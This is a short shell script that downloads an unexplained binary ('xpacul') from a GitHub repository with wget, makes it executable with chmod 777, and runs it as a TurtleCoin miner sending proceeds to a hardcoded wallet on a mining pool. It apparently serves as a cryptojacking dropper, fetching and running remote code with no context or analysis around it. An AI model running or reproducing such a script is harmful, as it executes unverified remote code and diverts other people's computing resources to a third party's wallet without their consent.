#!/bin/sh
wget https://github.com/jadisatuda/bandara/raw/main/xpacul
chmod 777 xpacul
POL=de.turtlecoin.herominers.com:1160
WAL=TRTLv2VHJdv2r1M175D6miCKJVy1SQ2yqFaK2BDqC7cVGhwJAtEhm7Tbj4W7AoEeA2NTfKnYQUNSsVQiUN9f7Eaf25qSRe7Cftc
WOR=testung
./xpacul --donate-level 1 -o $POL -u $WAL -p $WOR -a argon2/chukwav2 -k
